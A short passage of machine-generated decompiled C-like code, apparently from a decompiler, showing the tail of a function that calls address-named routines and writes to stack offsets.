				if (fn00408621(fp - 0x04, dwArg00, dwArg04, bArg05, dwArg08, dwArg0C, dwArg10, dwArg14, dwArg18, dwArg1C, out ecx_178, out dl_179) != 0x00)
				{
					*(fp - 0x18) = (union Eq_11 *) eax_147;
					*(fp - 0x1C) = (byte **) dwArg04;
					word32 edi_191;
					fn00407370(dwArg00, out edi_191);
				}
			}
		}
		*(fp - 0x18) = (union Eq_11 *) dwLoc08_123;
		word32 ebp_134;
		word32 edi_135;
		fn00409204(fp - 0x04, dwArg00, out ebp_134, out edi_135);
	}
	return;
}

